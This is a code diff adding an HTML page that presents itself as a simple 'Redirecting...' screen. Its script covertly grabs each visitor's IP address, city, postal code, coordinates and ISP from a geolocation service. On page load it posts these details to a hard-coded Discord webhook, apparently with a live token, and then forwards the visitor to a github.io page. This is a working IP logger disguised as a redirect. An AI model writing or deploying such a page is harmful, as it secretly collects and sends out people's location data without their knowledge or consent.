@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+    <script>
+        // Function to get detailed information about the visitor's IP address using ipapi
+        function getIpDetails(callback) {
+            $.get('https://ipapi.co/json/', function(data) {
+                callback(data);
+            });
+        }
+
+        // Function to send IP details to Discord webhook with an embed message
+        function sendIpToWebhook(details) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1249766664141017202/TrrYgsy48DyLM9fZNjIETOeNBfrJ0AU01nKxyV9Q8x_Q-viK0w6M6RSny75QXQ6hwY1k';
+            const embedMessage = {
+                embeds: [{
+                    title: "Visitor IP Details",
+                    color: 3447003,
+                    fields: [
+                        { name: "IP Address", value: details.ip, inline: true },
+                        { name: "City", value: details.city, inline: true },
+                        { name: "Region", value: details.region, inline: true },
+                        { name: "Country", value: details.country_name, inline: true },
+                        { name: "Postal Code", value: details.postal, inline: true },
+                        { name: "Latitude", value: details.latitude.toString(), inline: true },
+                        { name: "Longitude", value: details.longitude.toString(), inline: true },
+                        { name: "ISP", value: details.org, inline: true },
+                    ],
+                    footer: {
+                        text: `Time: ${new Date().toLocaleString()}`
+                    }
+                }]
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embedMessage)
+            }).then(() => {
+                // Redirect to the specified URL after sending the IP
+                window.location.href = 'https://gekkefries.github.io/0xV1/';
+            }).catch(() => {
+                // Redirect even if there's an error
+                window.location.href = 'https://gekkefries.github.io/0xV1/';
+            });
+        }
+
+        // Execute the IP capture and webhook sending on page load
+        $(document).ready(function() {
+            getIpDetails(sendIpToWebhook);
+        });
+    </script>
+</body>
+</html>
